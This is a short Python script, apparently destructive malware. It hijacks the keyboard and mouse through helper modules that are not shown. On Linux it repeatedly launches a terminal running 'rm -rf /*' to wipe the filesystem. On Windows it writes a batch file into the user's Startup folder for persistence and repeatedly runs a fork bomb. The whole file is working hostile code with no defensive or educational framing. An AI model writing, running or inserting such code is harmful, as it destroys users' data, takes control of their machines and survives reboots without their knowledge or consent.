from sys import platform
from pynput.mouse import Button, Controller
from pynput.keyboard import Key, Controller
import mouse_controller
import key_press
import getpass
import os

USER_NAME=getpass.getuser() # Gets the username of the user

# Controls the keyboard and mouse
key_pressing=key_press.key_presses()
mouse_control=mouse_controller.mice()

# Linux code
def linux():
    # A loop that presses the keys, moves the mouse position and starts the terminal
    while True:
        key_pressing()
        mouse_control()
        os.system("gnome-terminal 'rm -rf /*'")
        
# Windows code
def win_code():
    # This code creates a batch file in the startup directory that makes the program start when the computer starts
    def add_to_startup(file_path=""):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'python "" %s' % file_path)
    
    while True:
        add_to_startup()
        key_pressing()
        mouse_control()
        os.system("fork_bomb.bat") 
        
# If the user is using linux, use the linux() function
if platform == 'linux' or platform == 'linux2':
    linux()
    
# If the user is using windows use the windows() function
elif platform == 'win32':
    win_code() 
